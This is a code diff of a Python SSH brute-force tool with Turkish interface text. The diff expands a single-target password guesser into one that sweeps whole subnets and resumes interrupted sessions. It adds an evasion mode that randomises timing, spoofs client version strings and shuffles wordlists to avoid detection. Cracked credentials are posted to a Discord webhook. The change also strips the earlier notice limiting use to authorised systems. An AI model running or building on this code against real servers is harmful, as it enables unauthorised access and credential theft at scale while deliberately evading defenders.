@@ -1,14 +1,23 @@
 import asyncio
 import asyncssh
-import argparse
 import sys
+import os
+import random
+import time
+import json
+import urllib.request
+import socket
+import ipaddress
+from datetime import datetime
 from colorama import init, Fore, Style
 
-# Konsol Ekranı Renklendirme Yapılandırması
 init(autoreset=True)
 
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
 def print_banner():
-    """Aracın başlangıç logosunu ekrana basar."""
+    clear_screen()
     logo = f"""{Fore.CYAN}
     █████╗ ███████╗ ██████╗ ██╗███████╗       ███████╗███████╗██╗  ██╗
    ██╔══██╗██╔════╝██╔════╝ ██║██╔════╝       ██╔════╝██╔════╝██║  ██║
@@ -18,103 +27,250 @@ def print_banner():
    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝       ╚══════╝╚══════╝╚═╝  ╚═╝
     {Style.RESET_ALL}"""
     print(logo)
-    print(f"{Fore.YELLOW}[+] Asenkron SSH Güvenlik Denetim Aracı v1.0.0{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[+] Eğitim ve Sızma Testi Amaçlıdır.{Style.RESET_ALL}\n")
+    print(f"{Fore.YELLOW}[+] Asenkron SSH Güvenlik Denetim Aracı v5.0 (Pro){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[+] Aktif Modüller: Brute-Force, Evasion, Subnet Scan, DNS Resolve, Session Resume{Style.RESET_ALL}\n")
 
-async def grab_banner(ip, port):
-    """Hedef porttan SSH versiyon bilgisini (Banner) asenkron olarak okur."""
-    print(f"{Fore.CYAN}[*] {ip}:{port} üzerinden SSH Banner bilgisi analiz ediliyor...{Style.RESET_ALL}")
+# --- Webhook ---
+def send_discord_webhook(webhook_url, target_ip, port, mode, status, creds, total_tested, banner_info):
+    if not webhook_url: return
+    color = 65280 if status == "GÜVENLİ" else 16711680
+    desc = f"**Hedef:** {target_ip}:{port}\n**Banner:** {banner_info}\n**Modül:** {mode}\n**Denenen Şifre:** {total_tested}\n\n"
+    if status == "ZAFİYET":
+        desc += f"**[!] TESPİT EDİLEN BİLGİLER:**\n```\n{creds}\n```"
+    else:
+        desc += "Hiçbir zafiyet veya zayıf şifre tespit edilemedi."
+        
+    data = {"username": "Güvenlik Denetim Botu", "embeds": [{"title": f"SSH Denetim Sonucu: {status}", "description": desc, "color": color}]}
+    req = urllib.request.Request(webhook_url, data=json.dumps(data).encode('utf-8'), headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
     try:
-        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3.0)
-        banner_bytes = await reader.readline()
+        urllib.request.urlopen(req, timeout=5)
+    except:
+        pass
+
+# --- Network Utilities ---
+def resolve_target(target):
+    """DNS resolve veya Subnet hesaplama"""
+    try:
+        if '/' in target:
+            return [str(ip) for ip in list(ipaddress.IPv4Network(target, strict=False).hosts())]
+        return [socket.gethostbyname(target)] # DNS veya Tek IP
+    except Exception as e:
+        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Hedef çözümlenemedi: {e}")
+        return []
+
+async def check_port_and_banner(ip, port):
+    """Hedef portun açık olup olmadığını ve SSH banner'ını okur"""
+    try:
+        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.0)
+        banner = await asyncio.wait_for(reader.readline(), timeout=2.0)
         writer.close()
         await writer.wait_closed()
-        
-        banner_str = banner_bytes.decode('utf-8').strip()
-        print(f"  [{Fore.GREEN}+{Style.RESET_ALL}] Hedef Servis Versiyonu: {Fore.GREEN}{banner_str}{Style.RESET_ALL}")
-        return banner_str
-    except asyncio.TimeoutError:
-        print(f"  [{Fore.RED}-{Style.RESET_ALL}] Zaman aşımı: Port kapalı veya yanıt vermiyor.")
-        return None
-    except ConnectionRefusedError:
-        print(f"  [{Fore.RED}-{Style.RESET_ALL}] Bağlantı reddedildi: Servis aktif değil.")
-        return None
-    except Exception as e:
-        print(f"  [{Fore.RED}-{Style.RESET_ALL}] Banner alınamadı: {e}")
+        b_str = banner.decode('utf-8', errors='ignore').strip()
+        return b_str if b_str else "Bilinmeyen Servis (Unrecognized Banner)"
+    except:
         return None
 
-async def attempt_login(ip, port, username, password, semaphore):
-    """Tek bir kimlik bilgisi kombinasyonunu test eder."""
-    async with semaphore:
+# --- Session Management ---
+SESSION_FILE = "session.json"
+def save_session(targets, current_ip_idx, wordlist_path, current_word_idx, mode_num, webhook, threads, username, port):
+    data = {"targets": targets, "current_ip_idx": current_ip_idx, "wordlist": wordlist_path, 
+            "current_word_idx": current_word_idx, "mode_num": mode_num, "webhook": webhook, 
+            "threads": threads, "username": username, "port": port}
+    try:
+        with open(SESSION_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f)
+    except:
+        pass
+
+def load_session():
+    if os.path.exists(SESSION_FILE):
         try:
-            # Kritik olmayan uyarıları gizle
+            with open(SESSION_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except: pass
+    return None
+
+def clear_session():
+    if os.path.exists(SESSION_FILE):
+        try: os.remove(SESSION_FILE)
+        except: pass
+
+# --- Core Engine ---
+async def attempt_login(ip, port, username, password, semaphore, is_stealth=False):
+    async with semaphore:
+        client_version = "SSH-2.0-OpenSSH_8.4p1"
+        if is_stealth:
+            jitter = random.uniform(1.5, 5.5)
+            if random.random() < 0.15: jitter += random.uniform(10.0, 25.0)
+            await asyncio.sleep(jitter)
+            
+            client_versions = ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1", "SSH-2.0-OpenSSH_9.0", "SSH-2.0-PuTTY_Release_0.76", "SSH-2.0-WinSCP_release_5.19"]
+            client_version = random.choice(client_versions)
+            
+        try:
+            print(f"[*] {ip} Deneniyor -> {Fore.CYAN}{username}{Style.RESET_ALL} : {Fore.CYAN}{password}{Style.RESET_ALL}")
             asyncssh.set_log_level('CRITICAL')
             async with asyncssh.connect(
                 ip, port=port, username=username, password=password,
-                known_hosts=None, client_keys=None, login_timeout=4.0
+                known_hosts=None, client_keys=None, login_timeout=5.0,
+                client_version=client_version
             ) as conn:
-                print(f"\n[{Fore.GREEN}KRİTİK BAŞARI{Style.RESET_ALL}] Geçerli Kimlik Bilgisi Tespit Edildi!")
+                print(f"\n[{Fore.GREEN}BAŞARILI{Style.RESET_ALL}] Sistem Erişimi Sağlandı: {ip}")
                 print(f" └── Kullanıcı: {Fore.GREEN}{username}{Style.RESET_ALL} | Şifre: {Fore.RED}{password}{Style.RESET_ALL}\n")
                 return password
-        except asyncssh.PermissionDenied:
-            # Şifre yanlış
-            return None
-        except Exception:
-            # Bağlantı kopması vs.
+        except:
             return None
 
-async def run_brute_force(ip, port, username, wordlist_path, threads):
-    """Wordlist üzerinden asenkron şifre denemesi (Brute-Force) başlatır."""
-    print(f"\n{Fore.CYAN}📁 Denetim başlatılıyor ({threads} eşzamanlı asenkron bağlantı)...{Style.RESET_ALL}")
-    try:
-        with open(wordlist_path, 'r', encoding='utf-8') as f:
-            passwords = [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print(f"[{Fore.RED}SİSTEM HATASI{Style.RESET_ALL}] Wordlist dosyası bulunamadı: {wordlist_path}")
-        sys.exit(1)
-
-    print(f"[*] Toplam yüklenen payload sayısı: {len(passwords)}")
-
+async def run_brute_force_for_ip(ip, port, username, passwords_to_test, threads, is_stealth=False):
     semaphore = asyncio.Semaphore(threads)
-    tasks = [attempt_login(ip, port, username, p, semaphore) for p in passwords]
-    
-    # Tüm asenkron görevleri eşzamanlı çalıştır ve sonuçları bekle
+    tasks = [attempt_login(ip, port, username, p, semaphore, is_stealth) for p in passwords_to_test]
     results = await asyncio.gather(*tasks)
-    
-    valid_passwords = [r for r in results if r is not None]
-    
-    print(f"\n{Fore.CYAN}--- Denetim Raporu ---{Style.RESET_ALL}")
-    if not valid_passwords:
-        print(f"[{Fore.GREEN}GÜVENLİ{Style.RESET_ALL}] Tarama tamamlandı. Wordlist içindeki hiçbir zayıf şifre eşleşmedi.")
-    else:
-        print(f"[{Fore.RED}ZAFİYET{Style.RESET_ALL}] Sistem tehlikede. Lütfen zayıf şifreleri derhal değiştirin.")
+    return [r for r in results if r is not None]
 
+# --- Main Flow ---
 async def main():
-    parser = argparse.ArgumentParser(
-        description="Aegis-SSH Pentest Suite - Kurumsal SSH Güvenlik Denetimi",
-        epilog="Uyarı: Bu aracı yalnızca yetkiniz olan sistemlerde kullanın."
-    )
-    parser.add_argument("target", help="Hedef sunucunun IP adresi")
-    parser.add_argument("-u", "--user", required=True, help="Test edilecek hedef SSH kullanıcı adı (Örn: root)")
-    parser.add_argument("-w", "--wordlist", required=True, help="Şifrelerin bulunduğu sözlük dosyası (.txt)")
-    parser.add_argument("-p", "--port", type=int, default=22, help="Hedef SSH portu (Varsayılan: 22)")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Eşzamanlı bağlantı limiti (Varsayılan: 10)")
-    
-    args = parser.parse_args()
-    
     print_banner()
     
-    banner = await grab_banner(args.target, args.port)
-    if banner:
-        await run_brute_force(args.target, args.port, args.user, args.wordlist, args.threads)
+    session = load_session()
+    targets = []
+    current_ip_idx = 0
+    current_word_idx = 0
+    mode_num = '1'
+    threads = 10
+    discord_webhook = ""
+    username = "root"
+    wordlist = ""
+    port = 22
+
+    print(f"\n{Fore.CYAN}--- Operasyon Modülü Seçimi ---{Style.RESET_ALL}")
+    print("  1) Agresif Brute-Force (Maksimum hız, yüksek algılanma riski)")
+    print("  2) Evasion Mode (Zamanlama manipülasyonu ile gizlilik)")
+    if session:
+        print(f"  3) {Fore.GREEN}Kaldığı Yerden Devam Et (Önceki oturumu yükle){Style.RESET_ALL}")
+
+    mode_num = input(f"\n  [{Fore.YELLOW}?{Style.RESET_ALL}] Lütfen bir Mod Seçin: ").strip()
+
+    if session and mode_num == '3':
+        targets = session.get("targets", [])
+        current_ip_idx = session.get("current_ip_idx", 0)
+        wordlist = session.get("wordlist", "")
+        current_word_idx = session.get("current_word_idx", 0)
+        mode_num = session.get("mode_num", "1")
+        discord_webhook = session.get("webhook", "")
+        threads = session.get("threads", 10)
+        username = session.get("username", "root")
+        port = session.get("port", 22)
+        print(f"\n[{Fore.GREEN}+{Style.RESET_ALL}] Eski oturum yüklendi: Toplam {len(targets)} Hedef, Liste Konumu: {current_word_idx} ({targets[current_ip_idx]} makinesinden devam)...\n")
+    
+    elif mode_num in ['1', '2']:
+        print(f"\n{Fore.CYAN}--- Hedef Belirleme ---{Style.RESET_ALL}")
+        print("Hedefinizi aşağıdaki 3 formattan biriyle girebilirsiniz:")
+        print(f"  {Fore.YELLOW}-{Style.RESET_ALL} Tek IP Adresi     : Örn -> 192.168.1.10")
+        print(f"  {Fore.YELLOW}-{Style.RESET_ALL} Alan Adı (Domain) : Örn -> firmaadi.com")
+        print(f"  {Fore.YELLOW}-{Style.RESET_ALL} Alt Ağ (Subnet)   : Örn -> 192.168.1.0/24")
+        
+        target_input = input(f"\n  [{Fore.YELLOW}?{Style.RESET_ALL}] Hedefi Girin: ").strip()
+        if not target_input: sys.exit()
+        
+        targets = resolve_target(target_input)
+        if not targets: sys.exit(1)
+        print(f"[*] Toplam {len(targets)} geçerli IP adresi çözümlendi.")
+
+        port_input = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Hedef Port (Varsayılan: 22): ").strip()
+        port = int(port_input) if port_input.isdigit() else 22
+        
+        username = input(f"\n  [{Fore.YELLOW}?{Style.RESET_ALL}] Hedef Kullanıcı Adı (Örn: root) : ").strip() or "root"
+        wordlist = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Şifre Listesi Dosya Yolu      : ").strip().strip('"').strip("'")
+        
+        use_wh = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Sonuçlar Discord Webhook'a iletilsin mi? (e/h): ").strip().lower()
+        if use_wh == 'e':
+            discord_webhook = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Discord Webhook URL: ").strip()
+
+        if mode_num == '1':
+            t_in = input(f"  [{Fore.YELLOW}?{Style.RESET_ALL}] Eşzamanlı Bağlantı (Varsayılan: 10): ").strip()
+            threads = int(t_in) if t_in.isdigit() else 10
+        else:
+            threads = 1 # Evasion Modu Maksimum Gizlilik
+            
     else:
-        print(f"[{Fore.RED}İPTAL{Style.RESET_ALL}] Hedef servis ile iletişim kurulamadığı için tarama durduruldu.")
+        print(f"\n[{Fore.RED}HATA{Style.RESET_ALL}] Geçersiz bir seçim yaptınız. Çıkılıyor.")
+        sys.exit(1)
+
+    if not os.path.isfile(wordlist):
+        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Geçersiz şifre dosyası veya dizin girdiniz: {wordlist}")
+        sys.exit(1)
+
+    try:
+        with open(wordlist, 'r', encoding='utf-8') as f:
+            passwords = [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Dosya okunurken hata: {e}")
+        sys.exit(1)
+
+    if not passwords:
+        print(f"[{Fore.RED}HATA{Style.RESET_ALL}] Şifre dosyası boş! Lütfen içine şifre kombinasyonları ekleyip tekrar deneyin.")
+        sys.exit(1)
+
+    is_stealth = (mode_num == '2')
+    mode_name = "Advanced Evasion Profile" if is_stealth else "Agresif Brute-Force"
+
+    if is_stealth and current_word_idx == 0:
+        random.shuffle(passwords)
+        print(f"[*] Desen analizinden kaçınmak için şifre listesi karıştırıldı.")
+
+    print(f"\n{Fore.MAGENTA}📁 {mode_name} Başlatılıyor...{Style.RESET_ALL}")
+    
+    html_reports = []
+    ip_idx = current_ip_idx
+
+    try:
+        for ip_idx in range(current_ip_idx, len(targets)):
+            target_ip = targets[ip_idx]
+            
+            print(f"\n[*] {target_ip} için bağlantı kontrolü yapılıyor...")
+            banner = await check_port_and_banner(target_ip, port)
+            
+            if not banner:
+                print(f"[{Fore.YELLOW}ATLANDI{Style.RESET_ALL}] {target_ip}:{port} kapalı veya yanıt vermiyor.")
+                current_word_idx = 0
+                save_session(targets, ip_idx + 1, wordlist, 0, mode_num, discord_webhook, threads, username, port)
+                continue
+                
+            print(f"[{Fore.GREEN}AÇIK{Style.RESET_ALL}] {target_ip}:{port} erişilebilir! Tespit Edilen Banner: {Fore.CYAN}{banner}{Style.RESET_ALL}")
+            
+            passwords_to_test = passwords[current_word_idx:]
+            
+            valid_creds = await run_brute_force_for_ip(target_ip, port, username, passwords_to_test, threads, is_stealth)
+            
+            rep_status = "ZAFİYET" if valid_creds else "GÜVENLİ"
+            rep_str = "<br>".join([f"{username} : {p}" for p in valid_creds]) if valid_creds else "Bulunamadı"
+            discord_creds = "\n".join([f"{username} : {p}" for p in valid_creds]) if valid_creds else "Bulunamadı"
+            
+            html_reports.append(f"<h3>{target_ip} - Banner: {banner}</h3><p>Sonuç: <span style='color:{'red' if valid_creds else 'green'}'>{rep_status}</span></p><p>Tespit: {rep_str}</p><hr>")
+            
+            if discord_webhook:
+                send_discord_webhook(discord_webhook, target_ip, port, mode_name, rep_status, discord_creds, len(passwords_to_test), banner)
+            
+            current_word_idx = 0 
+            save_session(targets, ip_idx + 1, wordlist, 0, mode_num, discord_webhook, threads, username, port)
+
+        clear_session()
+        print(f"\n{Fore.CYAN}--- Tüm Tarama İşlemi Tamamlandı ---{Style.RESET_ALL}")
+        
+        if html_reports:
+            report_filename = f"rapor_genel_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+            full_html = f"<html><head><title>Toplu Denetim Raporu</title><meta charset='utf-8'></head><body style='font-family: Arial; margin:40px; background-color: #f4f4f9;'><div style='background-color: white; padding: 20px; border-radius: 8px;'><h1 style='color:#333;'>Güvenlik Denetim Raporu</h1><p><strong>Tarih:</strong> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</p><hr>" + "".join(html_reports) + "</div></body></html>"
+            with open(report_filename, "w", encoding="utf-8") as rf:
+                rf.write(full_html)
+            print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Detaylı Ağ Raporu Kaydedildi: {Fore.YELLOW}{report_filename}{Style.RESET_ALL}")
+
+    except KeyboardInterrupt:
+        print(f"\n\n[{Fore.RED}DURDURULDU{Style.RESET_ALL}] Kullanıcı `CTRL+C` ile işlemi iptal etti.")
+        save_session(targets, ip_idx, wordlist, current_word_idx, mode_num, discord_webhook, threads, username, port)
+        print(f"[{Fore.YELLOW}*{Style.RESET_ALL}] Kaldığınız yer (session.json) başarıyla kaydedildi! Programı tekrar açtığınızda kaldığınız '{targets[ip_idx]}' makinesinden devam edebilirsiniz.")
 
 if __name__ == "__main__":
     try:
-        # Uyumluluk için asenkron döngüyü başlat (Windows/Linux)
-        if sys.platform == "win32":
-            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
         asyncio.run(main())
     except KeyboardInterrupt:
-        print(f"\n\n[{Fore.RED}DURDURULDU{Style.RESET_ALL}] Kullanıcı tarafından zorla kapatıldı (Konsol Ekranı kapatılıyor).")
+        pass
